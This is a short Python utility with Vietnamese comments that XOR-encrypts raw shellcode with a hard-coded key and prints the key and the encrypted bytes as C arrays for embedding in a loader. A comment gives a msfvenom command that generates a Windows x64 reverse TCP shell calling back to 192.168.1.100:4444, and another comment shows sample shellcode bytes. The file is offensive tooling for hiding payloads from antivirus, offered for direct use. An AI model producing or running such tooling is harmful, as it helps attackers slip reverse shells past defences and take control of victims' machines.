import sys

# ==================== CẤU HÌNH ====================
KEY = [0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, 0x11, 0x22]   # Key bạn đang dùng

# Raw shellcode (thay bằng shellcode thật của bạn)
# Ví dụ: msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shellcode.bin
raw_shellcode = b""   # ← Đọc từ file hoặc paste trực tiếp

# Nếu muốn đọc từ file .bin hoặc .raw
if len(sys.argv) > 1:
    with open(sys.argv[1], "rb") as f:
        raw_shellcode = f.read()
else:
    # Paste raw shellcode ở đây nếu không dùng file
    # raw_shellcode = b"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00..." 
    print("[-] Hãy paste raw shellcode hoặc dùng file .bin")
    sys.exit()

# ==================== XOR ENCRYPT ====================
encrypted = bytearray()
for i in range(len(raw_shellcode)):
    encrypted.append(raw_shellcode[i] ^ KEY[i % len(KEY)])

# ==================== IN RA C ARRAY ====================
print("unsigned char XorKey[] = {", end="")
print(", ".join(f"0x{k:02X}" for k in KEY), end=" };\n\n")

print("unsigned char EncryptedShellcode[] = {")
for i, b in enumerate(encrypted):
    if i % 16 == 0 and i != 0:
        print()
    print(f"0x{b:02X}", end="")
    if i != len(encrypted) - 1:
        print(", ", end="")
print("\n};")

print(f"\n[+] Độ dài shellcode sau encrypt: {len(encrypted)} bytes")